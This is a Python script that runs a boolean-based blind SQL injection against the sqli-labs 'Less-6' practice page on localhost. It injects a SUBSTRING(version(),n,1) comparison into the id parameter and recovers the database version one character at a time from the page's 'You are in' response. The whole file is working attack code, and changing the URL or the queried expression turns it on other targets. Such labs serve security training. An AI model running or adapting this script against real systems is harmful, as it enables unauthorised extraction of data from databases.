import requests
import string

url = "http://127.0.0.1/sqli-labs/Less-6/"

def payload(character, position):
    return f"?id=1\"+AND+SUBSTRING(version(),{position},1)='{character}'--+"
    
def send_request(character, position):
    temp_url = url + payload(character, position)
    content = requests.get(temp_url)
    
    if "You are in..........." in content.text:
        return True
    return False
        
def search_database_version():
    database_version = ""
    # charset = string.ascii_lowercase + string.digits + "_" + "."
    charset = string.digits + "."

    for position in range(1, 20): 
        found = False
        for char in charset:
            if send_request(char, position):
                database_version += char
                found = True
                break
        if not found:
            break

    print(f"Database version: {database_version}")

search_database_version()